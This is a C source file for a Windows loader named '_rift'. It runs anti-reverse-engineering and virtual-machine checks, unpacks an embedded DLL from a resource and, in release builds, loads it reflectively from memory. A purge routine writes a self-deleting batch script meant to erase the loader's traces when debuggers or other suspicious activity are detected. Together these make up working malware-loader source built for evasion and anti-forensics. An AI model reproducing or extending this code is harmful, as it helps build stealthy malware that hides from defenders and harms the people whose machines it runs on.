#include "pch.h"
#include "_rift.h"

INT WINAPI wWinMain(
	_In_     HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_     PWSTR     pCmdLine,
	_In_     INT       nCmdShow
) {
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(nCmdShow);
	{	// Initialize Process Information block
		HANDLE hPH = GetProcessHeap();
		g_PIB = (PPIB)HeapAlloc(hPH, 0, sizeof(PIB));
		g_PIB->hPH = hPH;
		g_PIB->hMH = hInstance;
		GetModuleFileNameW(hInstance, g_PIB->szMFN, MAX_PATH);
		GetCurrentDirectoryW(MAX_PATH, g_PIB->szCD);
	}

#ifndef _DEBUG
	// Protect Process
	BOOL bRE = fnAntiRE();
#endif
	fnInitializeXSR();

	{	// Test base64
		PVOID string = fnMalloc(259, 0);
		for (int i = 0; i < 259; i++)
			((PBYTE)string)[i] = (BYTE)(fnNext128p() >> 24);
		CopyMemory(string, "Hello this is a test string", 28);
		PVOID hash = fnMD5HashData(string, 4);

		SIZE_T bout;
		PVOID base = fnB64Encode(string, 4, &bout);
		fnFree(string);
		PVOID base2 = fnB64Decode(base, bout, &bout);
		fnFree(base);

		PVOID hash2 = fnMD5HashData(base2, 4);
		fnFree(base2);
		BOOL test = fnMD5Compare(hash, hash2);

		fnFree(hash);
		fnFree(hash2);
	}

	// init con
	fnOpenConsole();

	BOOL bVM = fnCheckVMPresent();

//	fnSetWrapFileName(L"RIFTKEY");
	SIZE_T nDll;
	PVOID pDll = fnUnpackResource(L"_rift.KEY", IDR_RIFTDLL, &nDll);
	if (!pDll)
		return 0x1;

#ifndef _DEBUG
	// "Reflective" DLL loading will only be used in the release build
	HMEMORYMODULE hDll = MemoryLoadLibrary(pDll, nDll);
	if (!hDll)
		return 0x2;

	pfnDllInit fnDllInit = (pfnDllInit)MemoryGetProcAddress(hDll, "fnDllInit");
	int a = fnDllInit(10);

	MemoryFreeLibrary(hDll);
#else
	HMODULE dhDll = LoadLibraryExW(L"_riftdll.dll", 0, LOAD_LIBRARY_SEARCH_APPLICATION_DIR);
	if (!dhDll)
		return 0x2;

	pfnDllInit fnDllInit = (pfnDllInit)GetProcAddress(dhDll, "fnDllInit");
	int a = fnDllInit(10);

	FreeLibrary(dhDll);
#endif
	fnFree(pDll, 0);

	{	// CleanUp
		HANDLE hPH = GetProcessHeap();
		HeapFree(hPH, 0, g_PIB);

	} return 0;
}

/*	This function basically does what it's called,
	it "cleans" (or better purges) everything it can and tries to destroy
	all traces of it self (the loader and everything else it extracts).
	It should get triggered ( / called) if any fatal error occurs,
	or the loader catches any suspicious activities (e.g. debuggers).  */
CONST static WCHAR t_szSelfDelBat[] = {
	L"@echo off\n"
	L"%x:\n"
	L"\tdel \"%s\" /f\n"
	L"\tif exist \"%s\" (\n"
	L"\t\tgoto %x\n"
	L"\t)\n"
	L"del \"%s\" /f"
};
VOID fnPurge() {
	// Prepare String for Filename of Batchfile
	PWSTR szFilePath = (PWSTR)fnMalloc(MAX_PATH * sizeof(WCHAR), 0);
	SIZE_T nRandom;
	PCWSTR szRandom = fnAllocRandomPathW(8, 16, &nRandom);
	CopyMemory(szFilePath, g_PIB->szCD, MAX_PATH * sizeof(WCHAR));
	PathCchAppend(szFilePath, MAX_PATH * sizeof(WCHAR), szRandom);
	PathCchAddExtension(szFilePath, MAX_PATH * sizeof(WCHAR), L".bat");

	// Prepare Script content
	PVOID pScriptW = fnMalloc(0x800, 0);
	UINT uiRandomID = fnNext128ss();
	PCWSTR szMFN = fnGetFileNameFromPathW(g_PIB->szMFN);
	StringCchPrintfW(pScriptW, 0x400, t_szSelfDelBat, uiRandomID, szMFN, szMFN, uiRandomID, fnGetFileNameFromPathW(szFilePath));

	// Convert to Raw (ANSI)
	SIZE_T nScript;
	StringCchLengthW(pScriptW, 0x400, &nScript);
	PSTR pScriptA = (PSTR)HeapAlloc(g_PIB->hPH, 0, 0x400);
	WideCharToMultiByte(CP_ACP, 0, pScriptW, -1, pScriptA, 0x400, 0, 0);
	fnFree(pScriptW);

	// Write to Disk
	fnWriteFileCW(szFilePath, pScriptA, nScript);
	fnFree(pScriptA);
}